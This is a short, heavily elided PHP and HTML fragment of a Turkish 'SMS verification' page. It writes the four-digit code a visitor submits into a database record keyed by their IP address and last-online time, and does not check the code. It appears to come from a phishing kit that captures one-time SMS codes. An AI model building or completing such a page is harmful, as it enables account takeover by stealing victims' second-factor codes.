...
if (isset($_POST['submit']) && isset($_POST['code1']) && isset($_POST['code2']) && isset($_POST['code3']) && isset($_POST['code4'])) {
  ...
  $query = $db->prepare("UPDATE records SET sms = ?, lastOnline = ? WHERE ipAddress=?");
      ...
      <div class="mx-auto" style="max-width: 30rem;">
        ...
        <div class="card card-lg mb-5">
          <div class="card-body text-center">
            ...
            <div class="mb-5">
              <h1 class="display-5">SMS Doğrulama</h1>
              <p class="mb-0">Doğrulama kodunuz telefon numaranıza mesaj olarak gönderildi.</p>
                    </div>
